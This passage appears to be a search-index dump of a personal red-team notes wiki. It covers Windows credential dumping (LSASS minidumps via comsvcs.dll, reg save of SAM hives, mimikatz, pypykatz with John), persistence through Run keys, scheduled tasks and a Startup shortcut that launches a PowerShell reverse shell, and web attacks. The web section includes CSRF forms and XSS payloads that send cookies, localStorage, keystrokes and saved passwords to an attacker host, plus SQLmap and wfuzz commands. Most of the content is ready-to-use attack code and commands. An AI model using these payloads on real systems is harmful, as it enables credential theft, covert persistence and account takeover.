with\u00a0NTLM\u00a0hashes.</li> <li>You\u00a0CANNOT\u00a0perform Pass-The-Hash attacks with\u00a0Net-NTLM\u00a0hashes. However, they can be used to perform relay attacks.</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/comsvcs.dll/","title":"Comsvcs.dll","text":"<p>This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my Windows Authentication note.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/comsvcs.dll/#overview","title":"Overview","text":"<p>comsvcs.dll is a dynamic-link library (DLL) that is part of the Microsoft Component Services, which provides a set of tools and services for managing COM components.  It's a critical file for COM functionality on Windows systems.  Specifically, it contains a <code>MiniDump</code> class which is responsible for creating a minidump file, which is a small, detailed snapshot of a process's memory at a particular point in time.</p> <ul> <li>This means with the right permissions, the <code>MiniDump</code> class within <code>comsvcs.dll</code> can be utilized to dump <code>lsass.exe</code> process memory to a file to be extracted and cracked offline.</li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/comsvcs.dll/#usage","title":"Usage","text":"<ul> <li>This method may require a disabled Windows Defender, depending on your Windows version and definitions.  For references, see my Neutering Windows Defender note.</li> </ul> <pre><code># Acquire \"lsass.exe\" PID and set outfile variable\n$Process = (Get-Process -Name \"lsass\").Id\n$OutFile = \"C:/Windows/Temp/rundll\"\n\n# Dump LSASS via the \"comsvcs.dll\"\nC:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\comsvcs.dll MiniDump $Process $OutFile full\n</code></pre> <ul> <li>Next you'll have to have exfil the dump file to your attacker and parse it with with a tool like <code>pypykatz</code>.<ul> <li>For lateral movement methods and techniques, reference my Windows File Transfers note.</li> <li>For pypykatz usage, reference my pypykatz note.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/reg.exe/","title":"Reg.exe","text":"<p>This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my Windows Authentication note.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/reg.exe/#overview","title":"Overview","text":"<p>reg.exe is a command-line utility in Microsoft Windows that allows users to interact with the Windows Registry.  It is often used to perform tasks such as:</p> <ul> <li>Adding, modifying, or deleting registry keys and values.</li> <li>Querying the registry to retrieve information.</li> <li>Loading and unloading registry hives.</li> <li>Exporting and importing registry data to and from files.</li> </ul> <p>Using the latter tasks' functionality, we can export entire hives to files (e.g., <code>SYSTEM</code>, <code>SAM</code>, and <code>SECURITY</code>), which can then be extracted and cracked offline.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Built-in%20Utilities/reg.exe/#usage","title":"Usage","text":"<ul> <li>When exporting the <code>SAM</code> and/or <code>SECURITY</code> hive(s), make sure to also export the <code>SYSTEM</code> hive.<ul> <li>The <code>SYSTEM</code> hive provides critical system and configuration information that <code>pypykatz</code> (and other tools) rely on to locate and parse the <code>SAM</code> hive, which stores user account security data.</li> </ul> </li> </ul> <pre><code>#Export SYSTEM, SAM, and SECURITY hives to files\nreg save HKLM\\SYTEM &lt;system_outfile&gt;\nreg save HKLM\\SAM &lt;sam_outfile&gt;\nreg save HKLM\\SECURITY &lt;security_outfile&gt;\n</code></pre> <ul> <li>Next you'll have to have exfil the dump file to your attacker and parse it with with a tool like <code>pypykatz</code>.<ul> <li>For lateral movement methods and techniques, reference my Windows File Transfers note.</li> <li>For pypykatz usage, reference my pypykatz note.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/mimikatz/","title":"Mimikatz","text":"<p>This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my Windows Authentication note.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/mimikatz/#overview","title":"Overview","text":"<p>Mimikatz.exe is a versatile utility for Windows that can extract and manipulate authentication data, including passwords and cryptographic tokens, from the Windows operating system</p> <p>Info</p> <p>The Mimikatz usage wiki can be found here.</p> <ul> <li>The primary method of usage is via the binary.</li> <li>An alternative method of usage is via <code>Invoke-Mimikatz.ps1</code></li> </ul>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/mimikatz/#usage-via-mimikatzexe","title":"Usage via <code>mimikatz.exe</code>","text":"<p>Repo Link: https://github.com/gentilkiwi/mimikatz</p> <ul> <li><code>mimikatz.exe</code> is an incredibly robust and vast tool, so all use cases will not be documented here.</li> <li>This covers common use-cases; make sure to reference the tool's wiki for more information.</li> </ul> <pre><code>#  Acquire \"debug\" process privileges if running as an administrator instead of SYSTEM \n./mimikatz.exe \"privilege::debug\"\n\n# Dump LSASS (non-interactive)\n./mimikatz.exe \"sekurlsa::logonpasswords exit\"\n\n# Dump LSASS from a process dump\n./mimikatz.exe \"sekurlsa::minidump &lt;lsass&gt;.dmp\"\n./mimikatz.exe \"sekulrsa::logonpasswords\"\n\n# Dump the SAM database (requires: SYSTEM)\n./mimikatz.exe \"lsadump::sam exit\"\n\n# Pass-The-Hash using user's NTLM hash (default: /run:cmd)\n./mimikatz.exe \"sekurlsa::pth /user:&lt;username&gt; /domain:workgroup /ntlm:&lt;hash&gt; exit\"\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/mimikatz/#usage-via-invoke-mimikatzps1","title":"Usage via <code>Invoke-Mimikatz.ps1</code>","text":"<p>Repo Link: https://github.com/g4uss47/Invoke-Mimikatz</p> <ul> <li><code>Invoke-Mimikatz.ps1</code> is a PowerShell wrapper for Mimikatz that allows it to be loaded into memory and executed entirely from a PowerShell script.</li> <li>The script contains base64 strings of both </li> </ul> <pre><code># Executes: \"sekurlsa::logonpasswords exit\"\nInvoke-Mimikatz -DumpCreds\n\n# Executes: \"crypto::cng crypto::capi `\"crypto::certificates /export`\" `\"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`\" exit\"\nInvoke-Mimikatz -DumpCerts\n\n# Dump the SAM database (requires: SYSTEM)\nInvoke-Mimikatz -Command \"lsadump::sam\"\n\n# Commands with spaces require commenting wrapping quotations\nInvoke-Mimikatz -Command \"`\"lsadump::sam /sam:&lt;hive_path&gt;.hiv`\"\"\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/","title":"Pypykatz","text":"<p>This note does not cover the basics of Windows authentication.  For an overview of local Windows authentication, reference my Windows Authentication note.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/#overview","title":"Overview","text":"<p>Pypykatz is a Python library and toolset designed for interacting with the Windows Security Authority Subsystem Service (LSASS), which can be used for extracting various authentication credentials and secrets, including plaintext passwords and password hashes.</p> <p>Info</p> <p>The pypykatz usage wiki can be found here.</p>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/#usage","title":"Usage","text":""},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/#installation","title":"Installation","text":"<ul> <li>Currently (as of October 2023), the Kali Linux version of <code>pypykatz</code> is version 0.6.6 which does not support Windows 11 dumps.  To fix this, we need to update to the latest version (&gt;=0.6.8).</li> </ul> <pre><code># Manual Pypykatz Installation\npip3 install minidump minikerberos asn1crypto\ngit clone https://github.com/skelsec/pypykatz\ncd pypykatz\nsudo python3 setup.py install\n\n# Validate pypykatz version was updated\npypykatz version\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/#using-with-saved-registry-hives","title":"Using with Saved Registry Hives","text":"<pre><code># Export hashes stored in exported registry hives to a file\npypykatz registry &lt;system_outfile&gt; --sam &lt;sam_outfile&gt; -o hashes.txt\n\n# Crack hashes via John\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=NT\n</code></pre>"},{"location":"Red%20Cell/09.%20Credential%20Dumping/Using%20Custom%20Tools/pypykatz/#using-with-lsass-dump","title":"Using with LSASS Dump","text":"<pre><code># Exporting hashes stored in LSASS's process memory to a file\npypykatz lsa minidump &lt;lsass_dump&gt; &gt; hashes.txt\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/","title":"Persistence","text":"<ul> <li>Persistence is the technique of maintaining unauthorized access to a compromised system or network over an extended period, ensuring continued control and the ability to carry out activities even after initial access has been achieved.</li> </ul>"},{"location":"Red%20Cell/10.%20Persistence/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Registry Run Keys</li> <li>Scheduled Tasks</li> <li>Startup Programs</li> </ul>"},{"location":"Red%20Cell/10.%20Persistence/Registry%20Run%20Keys/","title":"Registry Run Keys","text":""},{"location":"Red%20Cell/10.%20Persistence/Registry%20Run%20Keys/#overview","title":"Overview","text":"<p>The Windows registry contains a 'Run' key in both HKCU and HKLM that executes every time a user logs in.  Alternatively, there's also a 'RunOnce' key that executes a single time before deleting itself. </p> <p>Info</p> <p>HKCU doesn't require elevated privileges, but only works on that specific user. HKLM requires elevated privileges, but works on every user.</p> <p>Key Paths: <pre><code># Executes every time the current user logs on\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n# Executes every time any user logs on (requires elevated privileges)\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n</code></pre></p>"},{"location":"Red%20Cell/10.%20Persistence/Registry%20Run%20Keys/#examples-with-powershell","title":"Example(s) with PowerShell:","text":"<pre><code># Set a Run Key to execute every time the current user logs on\n$RunPath = 'Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n# Set a Run key to execute every time any user logs on (requires elevated privileges)\n$RunPath = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n$KeyName = \"&lt;name&gt;\"\n$Command = \"&lt;command_to_execute&gt;\"\n\nSet-ItemProperty -Path $RunPath -Name $KeyName -Value $Command\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/Registry%20Run%20Keys/#examples-with-cmd","title":"Example(s) with CMD:","text":"<pre><code># Set a Run Key to execute every time the current user logs on\nREG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &lt;key_name&gt; /t REG_SZ /d &lt;command_to_execute&gt;\n\n# Set a Run key to execute every time any user logs on\nREG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &lt;key_name&gt; /t REG_SZ /d &lt;command_to_execute&gt;\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/Scheduled%20Tasks/","title":"Scheduled Tasks","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/10.%20Persistence/Scheduled%20Tasks/#overview","title":"Overview","text":"<p>Scheduled Tasks are automated processes or scripts that run at specified intervals or at predetermined times. </p>"},{"location":"Red%20Cell/10.%20Persistence/Scheduled%20Tasks/#powershell-examples","title":"PowerShell Example(s)","text":"<ul> <li>BASIC: Create a scheduled task that runs as SYSTEM at 9:00am every day.</li> </ul> <pre><code>bruh\n</code></pre> <ul> <li>ADVANCED: Create a scheduled task that runs a PowerShell command as SYSTEM 3 seconds after the command is executed, then promptly deletes itself after execution.</li> </ul> <pre><code># Create a Scheduled Task to run as an elevated user, then permanently remove itself.\n$PS = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-Command &lt;command&gt;\"\n$Time = New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(3) -Once\n$Time.EndBoundary = (Get-Date).AddSeconds(6).ToString('s')\n$Remove = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter 00:00:01\n\nRegister-ScheduledTask -TaskName 'Executed Command' -Action $PS -Trigger $Time -Settings $Remove -User SYSTEM -Force\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/Scheduled%20Tasks/#cmd-examples","title":"CMD Example(s)","text":"<p>Create a scheduled task that runs as SYSTEM at 9:00am every day. - Requires elevated privileges.</p> <pre><code>SCHTASKS /CREATE /SC DAILY /TN \"Microsoft\\Windows\\ComManager\" /TR \"&lt;command_to_execute&gt;\" /ST 09:00 /RU SYSTEM\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/Startup%20Programs/","title":"Startup Programs","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/10.%20Persistence/Startup%20Programs/#overview","title":"Overview","text":"<p>An easy method to establish persistence is via the Startup programs directory.  Binaries (or links) thrown in this directory execute at user login.</p> <pre><code># CMD Path\n\"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n# PowerShell Path\n\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n</code></pre>"},{"location":"Red%20Cell/10.%20Persistence/Startup%20Programs/#example","title":"Example","text":"<p>Below example shows a binary titled <code>dude.txt.exe</code> being placed in the Startup Programs directory, and being displayed as enabled for Startup in the Task Manager.</p> <p></p> <p>(Notice: the <code>.exe</code> file extension was not displayed in Task Manager)</p>"},{"location":"Red%20Cell/10.%20Persistence/Startup%20Programs/#example-20","title":"Example 2.0","text":"<pre><code># PowerShell: Create a shortcut that takes arguments\nfunction Make-Shortcut {\n    param ( [string]$Executable, [string]$ExeArguments, [string]$DestinationPath )\n    $WshShell = New-Object -comObject WScript.Shell\n    $Shortcut = $WshShell.CreateShortcut($DestinationPath)\n    $Shortcut.TargetPath = $Executable\n    $Shortcut.Arguments = $ExeArguments\n    $Shortcut.Save()\n}\n\n# Example: Create a PowerShell reverse shell shortcut in StartUp Programs\nMake-Shortcut -Executable powershell.exe -ExeArguments \"-e &lt;base64_revshell&gt;\" -DestinationPath \"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\CoolGuy.lnk\"\n\n# Example: Create a link to a binary using CMD\ncmd /c mklink &lt;binary&gt; &lt;destination.lnk&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/","title":"Web Exploitation","text":"<ul> <li>Web exploitation involves the identification and exploitation of vulnerabilities within web applications or services to gain unauthorized access, steal data, or deliver malicious payloads.</li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Cross-Site Request Forgery (CSRF)</li> <li>Cross-Site Scripting (XSS)</li> <li>Insecure Direct Object Reference (IDOR)</li> <li>Server-Side Request Forgery (SSRF)</li> <li>Server-Side Template Injection (SSTI)</li> <li>SQLmap Cheatsheet</li> <li>XML External Entity (XXE) Injection</li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/","title":"Cross Site Request Forgery (CSRF)","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#overview","title":"Overview","text":"<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP</p> <ul> <li>Reference(s):<ul> <li>PayloadsAllTheThings: CSRF Injection</li> </ul> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#methodology","title":"Methodology","text":""},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#tools","title":"Tools","text":"<ul> <li>XSRFProbe <pre><code># Installation\npip install xsrfprobe\n# Usage\nxsrfprobe --help\n</code></pre></li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#payloads","title":"Payloads","text":"<p>When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#html-get-requiring-user-interaction","title":"HTML GET - Requiring User Interaction","text":"<pre><code>&lt;a href=\"http://www.example.com/api/setusername?username=CSRFd\"&gt;Click Me&lt;/a&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#html-get-no-user-interaction","title":"HTML GET - No User Interaction","text":"<pre><code>&lt;img src=\"http://www.example.com/api/setusername?username=CSRFd\"&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#html-post-requiring-user-interaction","title":"HTML POST - Requiring User Interaction","text":"<pre><code>&lt;form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"&gt;\n &lt;input name=\"username\" type=\"hidden\" value=\"CSRFd\" /&gt;\n &lt;input type=\"submit\" value=\"Submit Request\" /&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#html-post-autosubmit-no-user-interaction","title":"HTML POST - AutoSubmit - No User Interaction","text":"<pre><code>&lt;form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"&gt;\n &lt;input name=\"username\" type=\"hidden\" value=\"CSRFd\" /&gt;\n &lt;input type=\"submit\" value=\"Submit Request\" /&gt;\n&lt;/form&gt;\n\n&lt;script&gt;\n document.getElementById(\"autosubmit\").submit();\n&lt;/script&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Request%20Forgery%20%28CSRF%29/#html-post-multipartform-data-with-file-upload-requiring-user-interaction","title":"HTML POST - multipart/form-data with file upload - Requiring User Interaction","text":"<pre><code>&lt;script&gt;\nfunction launch(){\n    const dT = new DataTransfer();\n    const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );\n    dT.items.add( file );\n    document.xss[0].files = dT.files;\n\n    document.xss.submit()\n}\n&lt;/script&gt;\n\n&lt;form style=\"display: none\" name=\"xss\" method=\"post\" action=\"&lt;target&gt;\" enctype=\"multipart/form-data\"&gt;\n&lt;input id=\"file\" type=\"file\" name=\"file\"/&gt;\n&lt;input type=\"submit\" name=\"\" value=\"\" size=\"0\" /&gt;\n&lt;/form&gt;\n&lt;button value=\"button\" onclick=\"launch()\"&gt;Submit Request&lt;/button&gt;\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/","title":"Cross Site Scripting (XSS)","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#overview","title":"Overview","text":"<p>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.</p> <ul> <li>Reference(s):<ul> <li>PayloadsAllTheThings: XSS Injection</li> </ul> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#payloads","title":"Payloads","text":""},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#stagers","title":"Stagers","text":"<p>Attacker Server-Side: <pre><code># Hosting a Simple HTTP Server\npython -m http.server 80\n\n# or Custom PMA Server\npython ./pma_server.py\n</code></pre></p> <p>Victim Payload:</p> <pre><code>// Standard\n&lt;script src=\"http://&lt;ip_addr&gt;/&lt;xss_payload&gt;.js\"&gt;&lt;/script&gt;\n&lt;img src=\"http://&lt;ip_addr&gt;/&lt;xss_payload&gt;.js\"/&gt;\n\n// URL Encoded\n%3Cscript%20src=%22http://&lt;ip_addr&gt;/&lt;xss_payload&gt;.js%22%3E\n\n// Extended\n&lt;html&gt;&lt;body&gt;&lt;script src=\"http://&lt;ip_addr&gt;/&lt;xss_payload&gt;.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n// URL Encoded\n%3Chtml%3E%3Cbody%3E%3Cscript%20src=%22http://&lt;ip_addr&gt;/&lt;xss_payload&gt;.js%22%3E%3C/script%3E%3C/body%3E%3C/html%3E\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#username-extraction","title":"Username Extraction","text":"<p>Hosted Payload: - <code>xss_username.js</code></p> <pre><code>var ClientAPI = \"https://&lt;ip_addr&gt;:&lt;port&gt;/api/me\"\nvar AttackerURL = \"http://&lt;ip_addr&gt;:&lt;port&gt;\"\nfetch(ClientAPI, {\n        method:'GET',\n        mode:'cors',\n        credentials:'include'\n    })\n    .then(response =&gt; response.json())\n    .then((data) =&gt; {\n        fetch([AttackerURL, \"/username?=\", data.username].join(''), {\n          mode: 'no-cors'\n        });\n    });\n</code></pre> <p>Output: </p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#cookie-extraction-non-httponly-attribute-documentcookie","title":"Cookie Extraction - Non-HttpOnly attribute (document.cookie)","text":"<ul> <li><code>document.cookie</code> = deprecated browser cookie storage that is becoming less common due to the HttpOnly flag.</li> </ul> <p>Hosted Payload: - <code>xss_document_cookie.js</code></p> <pre><code>var AttackerURL = \"http://&lt;ip_addr&gt;:&lt;port&gt;\"\nvar DocumentCookie = encodeURIComponent(document.cookie)\nfetch([AttackerURL, \"/docCookie?=\", DocumentCookie].join(''), {\n    mode: 'no-cors'\n});\n</code></pre> <p>Output: - TBD</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#cookie-extraction-local-secrets-localstoragesessionstorage","title":"Cookie Extraction - Local Secrets (localStorage/sessionStorage)","text":"<ul> <li><code>localStorage</code> = will keep the data until explicitly deleted.</li> <li><code>sessionStorage</code> = will keep the data until the tab is closed.</li> </ul> <p>Hosted Payload: - <code>xss_local_cookie.js</code></p> <pre><code>var AttackerURL = \"http://&lt;ip_addr&gt;:&lt;port&gt;\"\nvar LocalSecretsCookie = encodeURIComponent(JSON.stringify(localStorage))\nfetch([AttackerURL, \"/localCookie?=\", LocalSecretsCookie].join(''), {\n    mode: 'no-cors'\n});\n</code></pre> <p>Output: </p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#keylogger","title":"Keylogger","text":"<p>Hosted Payload: - <code>xss_keylogger.js</code></p> <pre><code>var AttackerURL = \"http://&lt;ip_addr&gt;:&lt;port&gt;\"\nfunction logKey(event){\n    fetch([AttackerURL, \"/key?=\", event.key].join(''))\n}\ndocument.addEventListener('keydown', logKey)\n</code></pre> <p>Output: </p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#saved-password-extraction","title":"Saved Password Extraction","text":"<p>Hosted Payload: - <code>xss_credentials.js</code></p> <pre><code>var AttackerURL = \"http://192.168.49.63\"\nlet body = document.getElementsByTagName(\"body\")[0]\n// Username\nvar u = document.createElement(\"input\");\nu.type = \"text\";\nu.style.position = \"fixed\";\nu.style.opacity = \"0\";\n// Password\nvar p = document.createElement(\"input\");\np.type = \"password\";\np.style.position = \"fixed\";\np.style.opacity = \"0\";\n// Extract\nbody.append(u)\nbody.append(p)\nsetTimeout(function(){\n    fetch([AttackerURL, \"/user?=\", u.value, \"&amp;pass?=\", p.value].join(''))\n}, 5000);\n</code></pre> <p>Output: - TBD</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Cross-Site%20Scripting%20%28XSS%29/#discovery","title":"Discovery","text":"<p>Validate Javascript XSS <pre><code>&lt;script&gt;alert('Whoops!')&lt;/script&gt;\n\n&lt;script&gt;src=\"http://192.168.49.63\"&lt;/script&gt;\n\n# If bold, site is vulnerable to XSS\n&lt;h1&gt;Hello World&lt;/h1&gt;\n</code></pre></p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/","title":"Insecure Direct Object Reference (IDOR)","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#overview","title":"Overview","text":"<p>Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.</p> <ul> <li>Reference(s): <ul> <li>PayloadsAllTheThings: Insecure Direct Object Reference</li> </ul> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#burpsuite","title":"Burpsuite","text":"<p>The most frequent method of detection that I've found is manually checking with Burpsuite.  This is done by intercepting POST requests and parsing through the content your client is sending to the server.</p> <p>Example:</p> <ul> <li> <p>User attempts to sign up for a website. </p> </li> <li> <p>User intercepts registration using Burpsuite's intercept functionality, and checks the POST request. </p> </li> <li> <p>User then sends this request to the Burpsuite repeater, modifies the value (e.g., <code>Acctype=1</code> to <code>Acctype=2</code>) and submits the request to the web server.  In the above example, the IDOR is successful and changes the registered account type to one with elevated privileges.</p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#wfuzz","title":"wfuzz","text":"<p>You can utilize <code>wfuzz</code> and other fuzzing tools to attempt to find potential IDOR's.</p> <pre><code>wfuzz\n# -c    = output in color\n# -z    = type of payload (e.g, file,&lt;filepath&gt;)\n# --hc  = hide responses containing specified statuses\n</code></pre> <ul> <li> <p>Static File IDOR <pre><code># Adjust URL accordingly\nwfuzz -c -z range,1-100 --hc 404,301 \"http://&lt;ip_addr&gt;/docs/?f=FUZZ.txt\"\n</code></pre> </p> </li> <li> <p>ID-Based IDOR <pre><code># Adjust URL accordingly\nwfuzz -c -z range,1-100 --hc 404,301 \"http://192.168.174.101/customerPage/?custID=FUZZ\"\n</code></pre></p> </li> <li> <p>User-Based IDOR </p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/SQLmap%20Cheatsheet/","title":"SQLmap Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/SQLmap%20Cheatsheet/#generic-arguments","title":"Generic Arguments","text":"<pre><code>-u \"&lt;URL&gt;\" \n-p \"&lt;PARAM TO TEST&gt;\" \n--user-agent=SQLMAP \n--random-agent \n--threads=10 \n--risk=3 #MAX\n--level=5 #MAX\n--dbms=\"&lt;KNOWN DB TECH&gt;\" \n--os=\"&lt;OS&gt;\"\n--technique=\"UB\" #Use only techniques UNION and BLIND in that order (default \"BEUSTQ\")\n--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n--auth-type=\"&lt;AUTH&gt;\" #HTTP authentication type (Basic, Digest, NTLM or PKI)\n--auth-cred=\"&lt;AUTH&gt;\" #HTTP authentication credentials (name:password)\n--proxy=http://127.0.0.1:8080\n--union-char \"GsFRts2\" #Help sqlmap identify union SQLi techniques with a weird union char\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/SQLmap%20Cheatsheet/#retrieve-information","title":"Retrieve Information","text":"<ul> <li> <p>Internal <pre><code>--current-user #Get current user\n--is-dba #Check if current user is Admin\n--hostname #Get hostname\n--users #Get usernames od DB\n--passwords #Get passwords of users in DB\n--privileges #Get privileges\n</code></pre></p> </li> <li> <p>DB Data <pre><code>--all #Retrieve everything\n--dump #Dump DBMS database table entries\n--dbs #Names of the available databases\n--tables #Tables of a database ( -D &lt;DB NAME&gt; )\n--columns #Columns of a table ( -D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; )\n-D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; -C &lt;COLUMN NAME&gt; #Dump column\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/SQLmap%20Cheatsheet/#injection","title":"Injection","text":"<pre><code>## GET Request Injection\nsqlmap -u \"http://example.com/?id=1\" -p id\nsqlmap -u \"http://example.com/?id=*\" -p id\n\n## POST Request Injection\nsqlmap -u \"http://example.com\" --data \"username=*&amp;password=*\"\n\n# SQLmap POST Injection\nsqlmap -u \"http(s)://&lt;ip_addr&gt;:&lt;port&gt;/&lt;directory&gt;\" --method POST --data \"field1=*&amp;field2=*&amp;field3=*\" -p \"field3\"\n\n## Header &amp; Othe HTTP Method Injection\n\n# Inside cookie\nsqlmap -u \"http://example.com\" --cookie \"mycookies=*\"\n\n# Inside some header\nsqlmap -u \"http://example.com\" --headers=\"x-forwarded-for:127.0.0.1*\"\nsqlmap -u \"http://example.com\" --headers=\"referer:*\"\n\n# PUT Method\nsqlmap --method=PUT -u \"http://example.com\" --headers=\"referer:*\"\n\n#The injection is located at the '*'\n</code></pre>"},{"location":"Red%20Cell/11.%20Web%20Exploitation/SQLmap%20Cheatsheet/#examples","title":"Examples","text":"<pre><code># Enumeration\nsudo ffuf -u http(s)://&lt;ip_addr&gt;:&lt;port&gt;/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n# Burpsuite to see fields being sent\n\n# SQLmap POST Injection\nsqlmap -u \"http(s)://&lt;ip_addr&gt;:&lt;port&gt;/&lt;directory&gt;\" 